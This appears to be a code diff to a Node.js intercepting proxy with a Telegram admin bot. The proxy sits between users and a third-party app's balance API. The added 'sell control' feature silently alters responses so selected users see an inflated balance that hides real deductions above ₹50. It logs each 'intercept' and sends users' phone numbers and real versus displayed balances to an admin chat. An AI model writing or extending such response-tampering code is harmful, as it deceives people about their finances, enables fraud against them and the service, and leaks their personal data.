@@ -891,6 +891,55 @@ Example:
       return res.sendStatus(200);
     }
 
+    if (text.startsWith('/control sell ')) {
+      const sellTargetId = text.substring(14).trim();
+      if (!sellTargetId) { await bot.sendMessage(chatId, '❌ Format: /control sell <userId>'); return res.sendStatus(200); }
+      if (!data.userOverrides) data.userOverrides = {};
+      if (!data.userOverrides[sellTargetId]) data.userOverrides[sellTargetId] = {};
+      const currentState = !!data.userOverrides[sellTargetId].sellControl;
+      data.userOverrides[sellTargetId].sellControl = !currentState;
+      if (!currentState) {
+        delete data.userOverrides[sellTargetId].lastRealBalance;
+      }
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      const stateText = data.userOverrides[sellTargetId].sellControl ? '🟢 ON' : '🔴 OFF';
+      let msg = `🔒 Sell Control ${stateText}\n👤 User: ${sellTargetId}\n💰 Cut Amount: ₹50 (fixed)`;
+      if (data.userOverrides[sellTargetId].sellControl) {
+        msg += `\n\n📌 Next /mine call se balance track hoga`;
+        msg += `\n📌 Har sell cut ₹50 mein convert hoga`;
+      }
+      await bot.sendMessage(chatId, msg);
+      return res.sendStatus(200);
+    }
+
+    if (text === '/sell history' || text.startsWith('/sell history ')) {
+      const shTarget = text.startsWith('/sell history ') ? text.substring(14).trim() : '';
+      const sh = data.sellHistory || [];
+      if (sh.length === 0) { await bot.sendMessage(chatId, '📋 No sell cut history yet.'); return res.sendStatus(200); }
+      const filtered = shTarget ? sh.filter(h => String(h.userId) === shTarget) : sh;
+      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No sell history for user ${shTarget}`); return res.sendStatus(200); }
+      const last10 = filtered.slice(-10);
+      let totalOriginal = 0, totalModified = 0, totalSaved = 0;
+      for (const h of filtered) {
+        totalOriginal += h.originalCut || 0;
+        totalModified += h.modifiedCut || 0;
+        totalSaved += h.compensation || 0;
+      }
+      let msg = `🔒 SELL CUT HISTORY\n━━━━━━━━━━━━━━━━━━\n`;
+      msg += `📊 Total Intercepts: ${filtered.length}\n`;
+      msg += `📥 Total Original Cuts: ₹${totalOriginal.toFixed(2)}\n`;
+      msg += `✂️ Total Modified Cuts: ₹${totalModified.toFixed(2)}\n`;
+      msg += `💰 Total Saved: ₹${totalSaved.toFixed(2)}\n`;
+      msg += `━━━━━━━━━━━━━━━━━━\n\n`;
+      for (const h of last10) {
+        msg += `👤 ${h.userId} | ₹${h.originalCut} → ₹${h.modifiedCut} | ${h.time}\n`;
+      }
+      if (filtered.length > 10) msg += `\n... showing last 10 of ${filtered.length}`;
+      await bot.sendMessage(chatId, msg);
+      return res.sendStatus(200);
+    }
+
     if (text === '/history' || text.startsWith('/history ')) {
       const historyTarget = text.startsWith('/history ') ? text.substring(9).trim() : '';
       const history = data.balanceHistory || [];
@@ -1723,6 +1772,42 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
         }
       }
     }
+    let sellCutReport = null;
+    if (effectiveUserId && respData && typeof respData === 'object') {
+      const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
+      if (userOvr && userOvr.sellControl) {
+        const realBalance = parseFloat(respData.balance ?? respData.availableBalance ?? respData.amount ?? 0) || 0;
+        const lastReal = userOvr.lastRealBalance;
+        if (lastReal !== undefined && lastReal !== null) {
+          const drop = parseFloat((lastReal - realBalance).toFixed(2));
+          if (drop > 0) {
+            const desiredCut = 50;
+            const compensation = drop > desiredCut ? parseFloat((drop - desiredCut).toFixed(2)) : 0;
+            const prevAdded = data.userOverrides[String(effectiveUserId)].addedBalance || 0;
+            if (compensation > 0) {
+              data.userOverrides[String(effectiveUserId)].addedBalance = parseFloat((prevAdded + compensation).toFixed(2));
+            }
+            sellCutReport = {
+              userId: effectiveUserId,
+              phone: phone || '',
+              originalCut: drop,
+              modifiedCut: drop > desiredCut ? desiredCut : drop,
+              compensation: compensation,
+              prevAddedBalance: prevAdded,
+              newAddedBalance: data.userOverrides[String(effectiveUserId)].addedBalance || prevAdded,
+              realBalanceBefore: lastReal,
+              realBalanceAfter: realBalance,
+              time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+            };
+            if (!data.sellHistory) data.sellHistory = [];
+            data.sellHistory.push(sellCutReport);
+          }
+        }
+        data.userOverrides[String(effectiveUserId)].lastRealBalance = realBalance;
+        data._skipOverrideMerge = true;
+        await saveData(data);
+      }
+    }
     if (effectiveUserId && respData && typeof respData === 'object') {
       const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
       const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
@@ -1756,7 +1841,28 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
       saveData(freshData).catch(()=>{});
     }
     if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}\n💰 Balance: ${bal !== '' ? bal : 'N/A'}`).catch(()=>{});
+      if (sellCutReport) {
+        const r = sellCutReport;
+        const displayedBalance = parseFloat((r.realBalanceAfter + r.newAddedBalance).toFixed(2));
+        bot.sendMessage(data.adminChatId,
+          `🔒 SELL CUT INTERCEPTED\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `👤 User: ${r.userId}\n` +
+          `📱 Phone: ${r.phone || 'N/A'}\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `📥 Original Cut: ₹${r.originalCut}\n` +
+          `✂️ Modified Cut: ₹${r.modifiedCut}\n` +
+          `💰 Saved: ₹${r.compensation}\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `🏦 Real Balance: ₹${r.realBalanceBefore} → ₹${r.realBalanceAfter}\n` +
+          `📊 Added Balance: ₹${r.prevAddedBalance} → ₹${r.newAddedBalance}\n` +
+          `👁️ User Sees: ₹${displayedBalance}\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `🕐 Time: ${r.time}`
+        ).catch(()=>{});
+      } else {
+        bot.sendMessage(data.adminChatId, `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}\n💰 Balance: ${bal !== '' ? bal : 'N/A'}`).catch(()=>{});
+      }
     }
   } catch(e) { await transparentProxy(req, res); }
 });
